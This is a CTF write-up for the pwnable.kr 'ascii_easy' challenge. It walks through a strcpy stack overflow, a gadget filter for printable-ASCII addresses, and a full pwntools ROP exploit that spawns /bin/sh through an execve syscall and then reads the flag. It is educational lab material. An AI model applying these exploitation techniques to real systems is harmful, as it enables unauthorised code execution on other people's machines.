If my memory does not fail me, this is the first [pwnable.kr](pwnable.kr) challenge
that involves building a longer and more sophisticated ROP chain.

Let's as usual start by analyzing the binary:

```
❯ file ascii_easy
ascii_easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a74cff7b340c23d3f90db3d934c4ca328c4a6b8, not stripped
```

We are dealing with a `32-bit` binary.
This means that if we wanted to invoke a function we would have to pass it's arguments via the stack,
as you will later see this turns a complication which would change the way we approach the problem.

The "dynamically linked" part is not of interest to us since in the source code we can observe
that another instance of `libc` is mapped at a fixed address `BASE` (`0x5555e000`):

```c
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000)

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);

}
```

The program expects a single string of printable ascii characters as command line argument which it later passes
to `strcpy` exposing a potential buffer overflow in the stack frame of the `vuln` function.
A couple of ideas spring to mind here:
- return to `gets`, bypassing printable ascii restriction,
overwrite some part of the mapped `libc` with custom exploit and jump to that exploit.
- return to `system`/`execve` with an argument pointing to `/bin/sh`.

My initial idea was using `gets`, however this resulted in an `SIGSEGV`.
After some time of exploring in `GDB` I concluded that either the `gets` function wasn't supposed to be directly called
from the address associated with its symbol or that it was corrupted since it dereferenced an uninitialized stack value o_0.

Anyway this made me turn to the second approach - targeting `system`/`execve` directly.
There are a couple of hurdles here, for example neither
`system`, `execve` nor `/bin/sh` (built into `libc`, showcased later)
lie on printable ascii addresses yet we have to somehow arrange them on the stack, which seems hard.
(side note, all these problems are bypassable, you could use other functions from the exec family, i.e. `execv`,
and let the `filename` argument point to any string and then create a `/bin/sh` symlink with the name of the string).
Instead I resorted to a simpler approach:

- Construct a ROP chain that directly invokes `execve` as a system call.

In this scenario the arguments would be passed to registers,
which unlike the stack are easy to manipulate via ROP gadgets.

To understand how to do the ROP we need to get a general idea of how to set up the registers
for the `execve` system call (see [syscall reference table](https://x86.syscall.sh/)):
```
eax - 0xb (execve systemcall number)
ebx - const char * filename
ecx - const char * const * argv
edx - const char * const * envp
```
For `ebx` I targeted the `/bin/sh` address that comes built into `libc`.
```
❯ ROPgadget --binary libc-2.15.so --string /bin/sh
Strings information
============================================================
0x0015d7ec : /bin/sh
```
For `ecx` and `edx` I used addresses pointing to `NULL`.

To find gadgets with which I could do the exploit I used ROPgadget:
```
❯ ROPgadget --binary libc-2.15.so > out
```

I also wrote a short python script to filter out gadgets positioned at inaccessible addresses
(that is addresses which can't be written in printable ascii):

```python
def is_valid(addr):
    addr = '{:x}'.format(addr + 0x5555e000)
    for b in (addr[i:i+2] for i in range(0, 8, 2)):
        b = int(b, 16)
        if b < 0x20 or b > 0x7f:
            return False
    return True

gadgets = ''
with open('out', 'r') as f:
    for line in f:
        if line[:2] != '0x':
            continue
        addr = int(line[:10], 16)
        if is_valid(addr):
            gadgets += line

with open('gadgets', 'w') as f:
    f.write(gadgets)
```

The process of finding the right gadgets was definitely the hardest part of this challenge,
beside the filter script I used a variety of vim substitutions to substantially reduce the search space.
I encourage you to try go through the manual ROP chain building process yourself
it is fun and it will probably make you really appreciate tools for automatic ROP chain generation.

Bellow is the list of gadgets I used:

```
// set edx point to somewhere in the mapped memory so that we can use gadgets which dereference [edx]
0x00196525 : pop edx ; add dword ptr [edx], ecx ; ret

// set ebx point to '/bin/sh' (0x556bb7ec) (split non-ascii address of '/bin/sh' into sum of ascii addresses)
0x0014544b : add al, 0x5d ; pop ebx ; ret
0x000e9a81 : pop ebx ; ret
0x00094c4c : pop esi ; ret
0x00187554 : add ebx, esi ; add dword ptr [edx], ecx ; ret

// set edx point to NULL ; zero out eax
0x00095555 : pop edx ; xor eax, eax ; pop edi ; ret

// eax = 0xb ; set ecx point to NULL
0x00074040 : xor eax, eax ; ret
0x00174a51 : pop ecx ; add al, 0xa ; ret
0x00097b7a : inc eax ; pop esi ; pop edi ; pop ebp ; ret

// syscall
0x00109177 : int 0x80
```

And finally, here is the python exploit implementing the ROP chain:

```python
from pwn import *

BASE = 0x5555e000

payload = b'A' * 32
payload += p32(BASE + 0x00196525) # pop edx ; add dword ptr [edx], ecx ; ret
payload += p32(0x55565555) # -> edx
payload += p32(BASE + 0x0014544b) # add al 0x5d ; pop ebx ; ret
payload += p32(0x22336677) # -> ebx
payload += p32(BASE + 0x00094c4c) # pop esi ; ret
payload += p32(0x33385175) # -> esi
payload += p32(BASE + 0x00187554) # add ebx, esi ; add dword ptr [edx], ecx ; ret
payload += p32(BASE + 0x00095555) # pop edx ; xor eax, eax ; pop edi ; ret
payload += p32(BASE + 0x00008846) # -> edx
payload += b'junk'
payload += p32(BASE + 0x00174a51) # pop ecx ; add al, 0xa ; ret
payload += p32(BASE + 0x00008846) # -> ecx
payload += p32(BASE + 0x00097b7a) # inc eax ; pop esi ; pop edi ; pop ebp ; ret
payload += b'junk'
payload += b'junk'
payload += b'junk'
payload += p32(BASE + 0x00109177) # int 0x80
payload += b'\x00'

proc = process(['/home/ascii_easy/ascii_easy', payload])
proc.interactive()
proc.close()
```
```
ascii_easy@pwnable:~$ python /tmp/ez/script.py
[+] Starting local process '/home/ascii_easy/ascii_easy': pid 169644
[*] Switching to interactive mode
triggering bug...
$ ls
ascii_easy  ascii_easy.c  flag    intended_solution.txt  libc-2.15.so
$ cat flag
...(flag)...
```
